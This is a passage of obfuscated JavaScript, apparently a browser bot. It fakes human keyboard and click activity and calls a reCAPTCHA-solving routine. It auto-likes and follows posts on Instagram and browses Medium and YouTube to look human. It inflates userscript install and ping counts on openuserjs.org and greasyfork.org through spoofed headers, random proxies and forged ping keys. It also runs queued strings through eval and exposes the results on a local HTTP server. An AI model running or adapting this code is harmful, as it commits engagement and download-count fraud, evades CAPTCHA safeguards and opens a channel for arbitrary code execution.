                  a2[0x2 * 0x62f + -0x1 * -0xe87 + -0x1ae4] && 'object' != typeof a2[0x1890 + -0x1496 + -0x3f9] && warn('[WATCHDOG]' + '\x20option\x20ob' + 'ject\x20failu' + 're\x20here:', a2), await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dType'](a2[0x241 * 0x2 + -0x14f + -0x333]);
                  break;
                case 'stype':
                  {
                    const a9 = a2['shift']();
                    Check['nes'](a9);
                    const aa = a2['shift']();
                    Check['ia'](aa, Page, Frame);
                    const ab = a2['shift']();
                    Check['nes'](ab),
                    isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20pruning\x20t' + 'echniques\x20' + 'failed\x20in\x20' + 'stype:', ab, aa, a9, a2),
                    log('[debug]\x20in' + '\x20to\x20find:', aa, ab, ...a2);
                    const ac = await I(aa, ab, ...a2);
                    log('[debug]\x20fo' + 'und\x20elemen' + 't', ac),
                    await J(Z, ac, a9, 0x5 * -0x2d5 + 0x1af6 + 0xe * -0xea);
                  }
                  break;
                case 'solveV2':
                  {
                    const ad = a2[0x16c + -0x8 * 0x254 + 0x1134];
                    Check['ia'](ad, Page, Frame),
                    await Z['solveRecap' + 'tchaV2'](ad);
                  }
                  break;
                case 'sclick':
                  {
                    const ae = a2['shift'](),
                      af = a2['shift']();
                    (ae instanceof Page || ae instanceof Frame) && 'string' == typeof af && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20sclick:', a2),
                    await K(Z, [
                      'stype',
                      '_click',
                      ae,
                      af,
                      ...a2
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [ag] = a2;
                    Check['ia'](ag, Page, Frame);
                    const ah = ag['waitForNav' + 'igation']();
                    await K(Z, [
                      'sclick',
                      ...a2
                    ]),
                    await ah;
                  }
                  break;
                case 'view':
                  {
                    const ai = a2['shift'](),
                      aj = a2['shift']();
                    (ai instanceof Page || ai instanceof Frame) && 'string' == typeof aj && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20view:', a2),
                    await K(Z, [
                      'stype',
                      '_view',
                      ai,
                      aj,
                      ...a2
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ak, al] = a2;
                    Check['num'](ak),
                    Check['num'](al),
                    al ? ? = 0x1d99 + -0x3 * 0x617 + -0x1d * 0x64 + 0.3;
                    for (let am = ak; am-- && (await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= al));)
                      await H();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [an] = a2;
                    Check['ia'](an, Page, Frame);
                    const ao = an['waitForNav' + 'igation']();
                    await K(Z, 'enter'),
                    await ao;
                  }
                  break;
                case 'click':
                  {
                    const [ap, aq, ar] = a2;
                    if ('string' != typeof ap || ![
                        'boolean',
                        'string'
                      ]['includes'](typeof aq) || !(ar instanceof Page || ar instanceof Frame))
                      return void warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    await Z['clickSelec' + 'tor'](ap, aq, ar);
                  }
                  break;
                case 'ifclick':
                  {
                    const [as, au, av] = a2;
                    'string' == typeof as && [
                      'boolean',
                      'string'
                    ]['includes'](au) && (av instanceof Page || av instanceof Frame) || warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    let aw = await av['$'](as);
                    aw && await Z['clickSelec' + 'tor'](as, au, av);
                    try {
                      aw ? .['dispose'] ? .();
                    } catch (ax) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + a1[0x14ff + 0x1c52 + -0x65 * 0x7d]);
              }
            } else {
              const ay = a1['split'](',\x20');
              await H(), flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ay);
              let az = -0x2053 + -0x251d + 0x8ae * 0x8;
              for (let aA of ay) {
                switch (flags['debug'] && log('[SNIP' + az++ + (']\x20Executin' + 'g\x20step:\x20[') + aA + ']'), aA) {
                  case 'j':
                    await H();
                    break;
                  case 'tab':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', aA, ay);
                }
                await H();
              }
            }
          return -0x15bc * 0x1 + 0x16cd + -0x88 * 0x2;
        }
        async function L(Z) {
          return Check['inst'](Z, Page), await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(-0x1252 + -0xc76 + 0x2120, -0x2352 + 0x258c + 0x5 * 0x1aa)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0x801 + 0x1eb0 + -0x2ad * 0xd, 0xc12 + 0x5b * -0x63 + -0x28b3 * -0x1)), -0x3 * -0xa4e + -0x2 * -0xd87 + -0x39f7;
        }
        let M = 0x1a79 + 0x4 * -0x864 + 0x717;

        function N(Z = aJ(0x1e, 'IdM5')) {
          return 'sadjqwdwkq' + 'dwqxzc' + sha1(++M + ('sadjqwdwkq' + 'dwq') + Z);
        }
        async function O(Z, a0) {
          Check['func'](Z), Check['inst'](a0, Page);
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('svg')]['find'](a4 => a4['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a4['getAttribu' + 'te']('aria-label') && window['__toolkit']['smartEleme' + 'ntVisible'](a4));
            a3 && a3['classList']['add'](a2);
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1,
            0x1 * -0xe91 + -0x1f48 + -0x1 * -0x2dda,
            a0
          ]);
        }
        async function P(Z, a0) {
          const a1 = N();
          await a0['evaluate'](a2 => {
            const aO = b;
            let a3 = [...document['querySelec' + aO(0x12, 'YKWi')]('div')]['find'](a5 => 'Follow' === a5['innerText'] && window['__toolkit']['smartEleme' + 'ntVisible'](a5)),
              a4 = a3['className']['baseVal'];
            a3['className']['baseVal'] += ('' === a4 ? '' : '\x20') + a2;
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1,
            0x2 * -0x767 + 0x1 * -0x8da + 0x17a9,
            a0
          ]);
        }
        async function Q(Z) {
          await Z['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await Z['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > 0x3f + -0x9 * -0x1f + -0x155;
            } catch (a0) {
              return 0x877 * 0x3 + -0x2537 + -0x5e9 * -0x2;
            }
          });
        }
        async function R(Z) {
          await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x2407 + 0x1 * -0x6fd + -0x1ab2, -0x592 + 0x901 + 0x3 * 0x25f)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0xa6 * 0x2b + -0x647 * -0x4 + 0x2d * 0x26, 0xdfd * 0x2 + 0x1659 * -0x1 + 0xbf3)), getRandomInt(0x685 * 0x5 + -0x1a77 + -0x1 * 0x621, 0xbf9 * -0x2 + -0x259e + 0x3d9a) <= -0x1ad * 0x6 + 0x14df + -0xaca && await O(K, Z), getRandomInt(0xbfe + 0x116f * 0x2 + -0x2edb * 0x1, -0x2e4 + 0x952 * -0x1 + 0xc9a) <= -0x2b0 * 0x2 + -0x1fde + 0x2561 && await P(K, Z);
        }
        async function S(Z) {
          return await Z['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (a0) {
                try {
                  return null !== a0['offsetPare' + 'nt'];
                } catch (a1) {
                  return 0x19e2 + 0x1be3 + 0xac1 * -0x5;
                }
              },
              'smartElementVisible' (a0) {
                try {
                  if (!a0 || !a0['getClientR' + 'ects']()['length'])
                    return -0x13fc + 0x23c0 + -0xfc4;
                  const a1 = getComputedStyle(a0);
                  if ('none' === a1['display'] || 'hidden' === a1['visibility'] || '0' === a1['opacity'])
                    return 0x3a6 * -0x8 + -0x191 * 0x5 + 0x2505;
                  const a2 = a0['getBoundin' + 'gClientRec' + 't']();
                  return a2['top'] >= 0xa7b * 0x1 + 0x2d5 * -0x3 + -0x4 * 0x7f && a2['left'] >= -0x1b11 + -0xeb * -0x21 + -0x33a && a2['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && a2['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? -0x138c * 0x1 + 0x23a0 + 0x5 * -0x337 : 0x1d6d * -0x1 + 0x5 * 0x685 + 0x1c * -0x1d;
                } catch (a3) {
                  return 0x6 * -0x3ff + -0x8d9 * -0x3 + -0x291;
                }
              },
              'extractLinks' (a0) {
                const a1 = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let a2, a3 = [];
                for (; null !== (a2 = a1['exec'](a0));)
                  a2['index'] === a1['lastIndex'] && a1['lastIndex']++, a2['forEach']((a4, a5) => {
                    0x4e7 * -0x2 + 0x1 * -0xfef + 0x19be === a5 && a3['push'](a4);
                  });
                return a3;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let T = -0x17 * -0x140 + -0x35 * 0xd + -0x1a0f;
        const U = V['length'],
          V = [
            async function() {
              const Z = await x('https://me' + 'dium.com/');
              let a0 = 0x1fce + 0xb35 + -0x4d * 0x8f;
              if (await Z['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](a1 => a0++), !a0) {
                await randomWait();
                for (let a1 = 0x2211 * -0x1 + 0x322 + 0x1eef; a1 < getRandomInt(-0x25a2 + 0x1 * 0x1bd2 + -0x167 * -0x7, -0x146f + -0x5bb + -0x1a2f * -0x1); a1++)
                  await q['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(0x5e3 * 0x3b + 0x9c4d + -0x10d3e), await Z['close']();
              }
            },
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = -0x4b * 0x1e + 0x3 * 0x7af + -0xe43;
              const a1 = getRandomInt(0x4 * -0x4ca + -0x1c93 + 0x2fc0, -0x24b1 + 0x20e1 + 0x1 * 0x3dd);
              for (; a0 < a1;) {
                try {
                  await y(Z), await G['random']()(Z);
                } catch (a2) {
                  log(a2), await Z['goto']('https://ww' + 'w.youtube.' + 'com/');
                }
                a0++;
              }
              return await Z['close'](), -0x7 * 0x221 + 0x162c + -0x26c * 0x3;
            }
          ];
        for (;;) {
          try {
            const Z = f['length'] ? f['shift']() : V[T++ % U];
            'string' == typeof Z ? g = await eval(Z) : await Z();
          } catch (a0) {}
          await wait(-0x1 * 0xc89 + -0x74b * -0x1 + -0x2 * -0x493);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(a1, a2) {
          '/latestev' === a1['url'] ? (a2['writeHead'](-0x1703 + -0x4 * 0x4c7 + 0x2ae7), a2['end']('$' === g ? g : '$' + g)) : (a2['writeHead'](-0x1597 + -0xa1 * -0x2 + 0x151d), a2['write']('v0.8'), a2['end']());
        })['listen'](process['env']['PORT'] || -0xe12 + -0x18fb * 0x1 + -0x469d * -0x1), flags['doOUJS']) {
        const a1 = 'https://op' + 'enuserjs.o' + 'rg/';

        function a2(a5, a6 = -0x2368 + 0xcbb + 0x16ae) {
          const aP = d;
          if (a5['includes']('Firefox'))
            return a5['slice'](a5['indexOf']('Firefox') + 'Firefox' [aP(0x5)] + (0x238a + -0x101a + -0x136f));
          const a7 = a5['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a8 = a5['slice'](a7),
            a9 = a8['slice'](0x4bc + 0x4e3 * 0x7 + -0xcfb * 0x3, a8['indexOf']('\x20'));
          return a6 ? a9['slice'](-0x94 * 0x4 + 0x1aa4 + -0x9 * 0x2b4, a9['indexOf']('.')) : a9;
        }

        function a3() {
          const a5 = data['oujsUAs']['random']();
          return [
            a5,
            a5['includes']('Firefox')
          ];
        }
        async function a4() {
          const aQ = d,
            a5 = data['oujsToAssi' + 'st']['random'](),
            a6 = a5['replace']('/scripts/', '/install/') + '.user.js',
            [a7, a8] = a3(),
            a9 = a2(a7),
            aa = {
              'signal': AbortSignal['timeout'](0xd * 0x27b + -0x219d + 0x286e),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a7,
                'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origi' + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a8 ? Object['assign'](aa['headers'], {
            'te': 'trailers'
          }) : Object['assign'](aa['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const ab = await fetch(a1, aa)['catch'](ae => {});
          if (!ab || !ab['headers'])
            return;
          if (null === ab['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const ac = {
            'signal': AbortSignal['timeout'](-0x2c * -0x4 + 0xd6b * 0x5 + -0x1cb7 * 0x1),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': aQ(0x0) + 'enuserjs.o' + 'rg',
              'user-agent': a7,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'referer': a1,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a8 ? Object['assign'](ac['headers'], {
              'te': 'trailers'
            }) : Object['assign'](ac['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a5, ac)['catch'](ae => {}))
            return;
          const ad = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a8 ? Object['assign'](ad['headers'], {
            'te': 'trailers'
          }) : Object['assign'](ad['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a6, ad);
        }
        a4();
        for (let a5 = -0x22ab + -0x1a91 + 0x3d3c; a5 < -0x15 * -0x83 + 0x1 * -0x2485 + -0x19ca * -0x1; a5++)
          setTimeout(a4, (0x1c2bd * -0x1 + -0x568 + -0x2b * -0x100f) * a5 * getRandomInt(0x1 * 0x167 + 0x29f * -0x2 + 0x3d8, 0x3e4 + 0x71 * -0x3 + -0x28e));
        setInterval(() => {
          a4();
          for (let a6 = 0x559 + -0x1 * -0x36e + -0x8c7 * 0x1; a6 < -0x8 * 0x13d + -0x1e13 + 0x1 * 0x27ff; a6++)
            setTimeout(a4, (0x3861 * 0x3 + -0x6b * -0x97 + 0x1 * 0x220) * a6 * getRandomInt(0x1 * -0x1029 + -0x1 * 0x2ed + -0x9 * -0x21f, -0x1482 + -0x86d + 0xc3 * 0x26));
        }, 0x417e7c + 0x1fd60f * -0x2 + 0x46 * 0xc23b);
      }
      if (flags['doGF']) {
        async function a6(a8 = null, a9 = -0x3 * 0xc02 + 0x112a + 0x12dc) {
          const aR = c,
            aa = makeFetchCookie(fetch),
            ab = a8 ? new HttpsProxyAgent(a8) : a8,
            ac = await aa('https://gr' + 'easyfork.o' + 'rg/en', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + aR(0xb) + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
              },
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ad = extractLinks(await ac['text']())['filter'](al => al['includes']('by-site'))['slice'](0x2 * -0xf1c + -0xa4 + 0x1edc, -(-0x32 * 0x71 + 0xc91 * 0x1 + 0x4c1 * 0x2)),
            ae = a9 && data['scriptTarg' + 'ets']['random'](),
            af = a9 ? ae['preRef'] : ad['random'](),
            ag = await aa(af, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ah = extractLinks(await ag['text']())['filter'](al => al['includes']('/scripts/') && !al['includes']('by-site'))['slice'](-0x11c5 + 0xa6d + 0x9 * 0xd1),
            ai = a9 ? ae['url'] : ah['random'](),
            aj = await aa(ai, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': af,
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ak = extractAnchorData(await aj['text']());
          if (ak['pingUrl']) {
            const al = sha1(ak['ipAddress'] + ak['scriptId'] + ak['pingKey']),
              am = ak['pingUrl'] + (ak['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(al);
            await aa('https://gr' + 'easyfork.o' + 'rg' + am + '&mo=3', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origi' + 'n'
              },
              'referrer': ai,
              'method': 'POST',
              'mode': 'cors',
              'agent': ab
            });
          } else
            warn('awdiwajdwj' + 'qdqw');
        }
        async function a7() {
          const a8 = await getRandomProxy();
          await a6(a8, 0x1368 + 0x1 * -0x1d8e + -0x6 * -0x1b1), random() <= 0xb * 0x3e + 0x11d9 + -0x1483 + 0.6 && await a6(a8, 0xc5 + -0x1280 + 0x11bc);
        }
        a7();
        for (let a8 = 0xb6c + -0xbf4 + -0x1 * -0x88; a8 < 0x491 + -0x11d5 * 0x1 + 0x28 * 0x55; a8++)
          setTimeout(a7, (-0x12e52 + 0x1 * -0xfc37 + 0x314e9 * 0x1) * a8 * getRandomInt(-0x68 + 0x1970 + -0x2b * 0x95, 0x1 * 0x1ae3 + -0x221f + 0x73f));
        setInterval(() => {
          a7();
          for (let a9 = 0x4 * -0x319 + 0x417 * 0x1 + 0x11 * 0x7d; a9 < 0x1be9 + -0x23d4 + 0x7ef; a9++)
            setTimeout(a7, (0x19f91 * -0x1 + 0x1ccdc + -0x69 * -0x1cd) * a9 * getRandomInt(-0x1de1 + -0x19a4 + -0x17 * -0x26a, -0x2503 + 0x21f3 * 0x1 + 0x1 * 0x313));
        }, 0xbea9 * 0x347 + 0x3bf61d + -0x1 * 0x12c4c7c);
      }
    } catch (a9) {
      warn(a9);
    }
    break;
  }
}();